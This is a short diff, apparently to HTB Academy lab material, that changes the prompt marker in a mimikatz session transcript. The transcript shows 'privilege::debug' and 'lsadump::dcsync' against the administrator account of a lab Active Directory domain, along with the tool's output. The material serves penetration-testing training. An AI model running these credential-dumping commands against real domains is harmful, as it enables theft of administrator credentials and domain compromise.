@@ -85,10 +85,10 @@ PS C:\htb> .\mimikatz.exe
  '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
   '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
 
-mimikatz # privilege::debug
+mimikatz :> privilege::debug
 Privilege '20' OK
 
-mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
+mimikatz :> lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
 [DC] 'INLANEFREIGHT.LOCAL' will be the domain
 [DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
 [DC] 'INLANEFREIGHT\administrator' will be the user account
